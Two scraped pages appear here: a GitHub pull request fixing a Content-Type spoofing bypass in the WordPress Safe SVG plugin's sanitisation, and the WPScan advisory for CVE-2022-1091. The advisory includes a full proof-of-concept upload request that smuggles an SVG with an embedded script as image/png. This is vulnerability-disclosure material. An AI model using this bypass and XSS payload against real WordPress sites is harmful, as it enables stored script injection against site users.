=== Content from github.com_a6cc6690_20250114_182743.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10up%2Fsafe-svg%2Fpull%2F28)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2F10up%2Fsafe-svg%2Fpull%2F28)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=10up%2Fsafe-svg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[10up](/10up)
/
**[safe-svg](/10up/safe-svg)**
Public

* [Notifications](/login?return_to=%2F10up%2Fsafe-svg) You must be signed in to change notification settings
* [Fork
  35](/login?return_to=%2F10up%2Fsafe-svg)
* [Star
   283](/login?return_to=%2F10up%2Fsafe-svg)

* [Code](/10up/safe-svg)
* [Issues
  15](/10up/safe-svg/issues)
* [Pull requests
  2](/10up/safe-svg/pulls)
* [Actions](/10up/safe-svg/actions)
* [Wiki](/10up/safe-svg/wiki)
* [Security](/10up/safe-svg/security)
* [Insights](/10up/safe-svg/pulse)

Additional navigation options

* [Code](/10up/safe-svg)
* [Issues](/10up/safe-svg/issues)
* [Pull requests](/10up/safe-svg/pulls)
* [Actions](/10up/safe-svg/actions)
* [Wiki](/10up/safe-svg/wiki)
* [Security](/10up/safe-svg/security)
* [Insights](/10up/safe-svg/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2F10up%2Fsafe-svg%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2F10up%2Fsafe-svg%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Better checking of the file type when determining which files are SVGs #28

 Merged

[jeffpaul](/jeffpaul)
merged 1 commit into
[develop](/10up/safe-svg/tree/develop "10up/safe-svg:develop")
from
[fix/proper-type-checking](/10up/safe-svg/tree/fix/proper-type-checking "10up/safe-svg:fix/proper-type-checking")

Feb 14, 2022

 Merged

# [Better checking of the file type when determining which files are SVGs](#top) #28

[jeffpaul](/jeffpaul)
merged 1 commit into
[develop](/10up/safe-svg/tree/develop "10up/safe-svg:develop")
from
[fix/proper-type-checking](/10up/safe-svg/tree/fix/proper-type-checking "10up/safe-svg:fix/proper-type-checking")

Feb 14, 2022

[Conversation
1](/10up/safe-svg/pull/28)
[Commits
1](/10up/safe-svg/pull/28/commits)
[Checks
0](/10up/safe-svg/pull/28/checks)
[Files changed](/10up/safe-svg/pull/28/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![dkotter](https://avatars.githubusercontent.com/u/916738?s=60&v=4)](/dkotter)

Copy link

Collaborator

### @dkotter **[dkotter](/dkotter)** commented [Feb 10, 2022](#issue-1131052356)

### Description of the Change

We currently have a function that is hooked into the `wp_handle_upload_prefilter` filter. In there we check if the file type is `image/svg+xml` and if so, we sanitize the file. If that sanitization process fails, we don't allow the file to be uploaded to WordPress.

There's a potential issue here though because the file type we rely on comes from the `Content-Type` of the original `form-data` request. Typically this will be automatically set to whatever the real file type is but in theory, someone could spoof this request and set `Content-Type` to be anything, like `image/png`. In this case, they could send an actual SVG in the `form-data` but set the `Content-Type` to be `image/png`, which would then bypass our sanitization process (but would still be uploaded to WordPress).

This PR fixes this by utilizing the core WordPress function `wp_check_filetype_and_ext` to get the file type, instead of relying on the value that comes from the request. This should still work in all legitimate cases and if someone were to try sending a proper SVG but they change the `Content-Type` in the request, it will also catch that.

I tested the following scenarios:

* Valid SVG uploaded without a custom `Content-Type` set. **Our sanitization kicks in** ✅
* Valid SVG uploaded with a custom `Content-Type` set (set to `image/png`). **Our sanitization kicks in** ✅
* Valid PNG uploaded without a custom `Content-Type` set. **No sanitization needed from us** ✅
* SVG file with a .png extension uploaded without a custom `Content-Type` set. **File rejected** ✅
* SVG file with a .png extension uploaded with a custom `Content-Type` set. **File rejected** ✅
* SVG file with no extension uploaded without a custom `Content-Type` set. **File rejected** ✅
* SVG file with no extension uploaded with a custom `Content-Type` set. **File rejected** ✅

### Alternate Designs

None

### Possible Drawbacks

Slight impact on performance but should be minimal

### Verification Process

Ensure that you can still properly upload SVGs in WordPress.

If desired, can also manually make a `curl` request to send an SVG with a manipulated `Content-Type` field, to verify that captures things correctly. I can provide an example `curl` command if needed.

### Checklist:

* I have read the [**CONTRIBUTING**](/CONTRIBUTING.md) document.
* My code follows the code style of this project.
* My change requires a change to the documentation.
* I have updated the documentation accordingly.
* I have added tests to cover my change.
* All new and existing tests passed.

### Changelog Entry

> Fixed - add better file type checking when looking for SVG files

Sorry, something went wrong.

All reactions

[![@dkotter](https://avatars.githubusercontent.com/u/916738?s=40&v=4)](/dkotter)

`[Instead of relying on the file type that comes from the file array, u…](/10up/safe-svg/pull/28/commits/44752cf0c875fdda2e3f58b386ee9460c81106fc "Instead of relying on the file type that comes from the file array, use a core WordPress function to determine this, to avoid any issues around spoofing the content-type")`
 …

`[44752cf](/10up/safe-svg/pull/28/commits/44752cf0c875fdda2e3f58b386ee9460c81106fc)`

```
…se a core WordPress function to determine this, to avoid any issues around spoofing the content-type
```

[![@dkotter](https://avatars.githubusercontent.com/u/916738?s=40&v=4)](/dkotter)
[dkotter](/dkotter)
self-assigned this
[Feb 10, 2022](#event-6046153803)

 [![@dkotter](https://avatars.githubusercontent.com/u/916738?s=40&v=4)](/dkotter)
[dkotter](/dkotter)
marked this pull request as draft
[February 10, 2022 21:51](#event-6046175709)

 [![@dkotter](https://avatars.githubusercontent.com/u/916738?s=40&v=4)](/dkotter)
[dkotter](/dkotter)
marked this pull request as ready for review
[February 10, 2022 21:52](#event-6046183641)

[![darylldoyle](https://avatars.githubusercontent.com/u/968731?s=60&v=4)](/darylldoyle)

**[darylldoyle](/darylldoyle)**
approved these changes
[Feb 11, 2022](#pullrequestreview-880350785)

 [View reviewed changes](/10up/safe-svg/pull/28/files/44752cf0c875fdda2e3f58b386ee9460c81106fc)

Copy link

Collaborator

### @darylldoyle **[darylldoyle](/darylldoyle)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks good to me, I tested it this morning and can confirm it's returning the correct mime type using this method!

Sorry, something went wrong.

 👍
1
 jeffpaul reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![@jeffpaul](https://avatars.githubusercontent.com/u/2818133?s=40&v=4)](/jeffpaul)
[jeffpaul](/jeffpaul)
added this to the [1.10.0](/10up/safe-svg/milestone/3) milestone
[Feb 14, 2022](#event-6068994173)

[![@jeffpaul](https://avatars.githubusercontent.com/u/2818133?s=40&v=4)](/jeffpaul)
[jeffpaul](/jeffpaul)
merged commit [`00cb9a8`](/10up/safe-svg/commit/00cb9a86d1bff2214714557d1901ec3896564e50)
into
develop

[Feb 14, 2022](https://github.com/10up/safe-svg/pull/28#event-6068995497)

 [![@jeffpaul](https://avatars.githubusercontent.com/u/2818133?s=40&v=4)](/jeffpaul)
[jeffpaul](/jeffpaul)
deleted the
fix/proper-type-checking

branch
[February 14, 2022 17:42](#event-6068995559)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2F10up%2Fsafe-svg%2Fpull%2F28)

Reviewers

[![@darylldoyle](https://avatars.githubusercontent.com/u/968731?s=40&v=4)](/darylldoyle) [darylldoyle](/darylldoyle)

darylldoyle approved these changes

Assignees

[![@dkotter](https://avatars.githubusercontent.com/u/916738?s=40&v=4)](/dkotter) [dkotter](/dkotter)

Labels

None yet

Projects

None yet

Milestone

 [**1.9.10**](/10up/safe-svg/milestone/3 "1.9.10")

Development

Successfully merging this pull request may close these issues.

3 participants

[![@dkotter](https://avatars.githubusercontent.com/u/916738?s=52&v=4)](/dkotter) [![@darylldoyle](https://avatars.githubusercontent.com/u/968731?s=52&v=4)](/darylldoyle) [![@jeffpaul](https://avatars.githubusercontent.com/u/2818133?s=52&v=4)](/jeffpaul)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from wpscan.com_df079e37_20250114_182744.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Safe SVG < 1.9.10 - SVG Sanitisation Bypass

### Description

The sanitisation step of the plugin can be bypassed by spoofing the content-type in the POST request to upload a file. Exploiting this vulnerability, an attacker will be able to perform the kinds of attacks that this plugin should prevent (mainly XSS, but depending on further use of uploaded SVG files potentially other XML attacks).

### Proof of Concept

POST /wp-admin/async-upload.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27451310545300823063986174174
Content-Length: 947
Connection: close
Cookie: [user with upload capability]
-----------------------------27451310545300823063986174174
Content-Disposition: form-data; name="name"
xss.svg
-----------------------------27451310545300823063986174174
Content-Disposition: form-data; name="action"
upload-attachment
-----------------------------27451310545300823063986174174
Content-Disposition: form-data; name="\_wpnonce"
b281e72731
-----------------------------27451310545300823063986174174
Content-Disposition: form-data; name="async-upload"; filename="xss.svg"
Content-Type: image/png
<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">alert(/XSS/);</script>
</svg>
-----------------------------27451310545300823063986174174--

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

safe-svg](https://a8cteam5105.wordpress.com/plugin/safe-svg/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 1.9.10

### References

CVE
[CVE-2022-1091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1091)

URL
<https://github.com/10up/safe-svg/pull/28>

### Miscellaneous

Original Researcher
David Hamann

Submitter
David Hamann

Submitter website
<https://davidhamann.de>

Submitter twitter
[d\_hamann](//twitter.com/d_hamann)

Verified
Yes

WPVDB ID
[4d12533e-bdb7-411f-bcdf-4c5046db13f3](https://a8cteam5105.wordpress.com/vulnerability/4d12533e-bdb7-411f-bcdf-4c5046db13f3/)

### Timeline

Publicly Published
2022-03-25 (about 2 years ago)

Added
2022-03-25 (about 2 years ago)

Last Updated
2022-04-11 (about 2 years ago)

### Other

Published
Title

Published
2022-08-17
Title
[Titan Anti-spam & Security < 7.3.1 - Protection Bypass due to IP Spoofing](https://a8cteam5105.wordpress.com/vulnerability/f1af4267-3a43-4b88-a8b9-c1d5b2aa9d68/)

Published
2024-06-04
Title
[BuddyForms < 2.8.10 - Email Verification Bypass due to Insufficient Randomness](https://a8cteam5105.wordpress.com/vulnerability/aa238cd4-4329-4891-b4ff-8268a5e18ae2/)

Published
2017-03-17
Title
[BuddyPress Docs <= 1.9.2 - Authenticated Lack of Authorisation](https://a8cteam5105.wordpress.com/vulnerability/258d3673-3fa9-4b9c-a18e-c65ce2edd8fe/)

Published
2018-03-02
Title
[NextGEN Gallery < 2.2.50 - Galley Paths Not Secured](https://a8cteam5105.wordpress.com/vulnerability/1097f6e4-1473-4969-8f27-a71945b7c09b/)

Published
2023-05-08
Title
[Hide My WP Ghost – Security < 5.0.20 - IP Address Spoofing](https://a8cteam5105.wordpress.com/vulnerability/0ded58d4-5b94-4e74-863e-639935ee2758/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

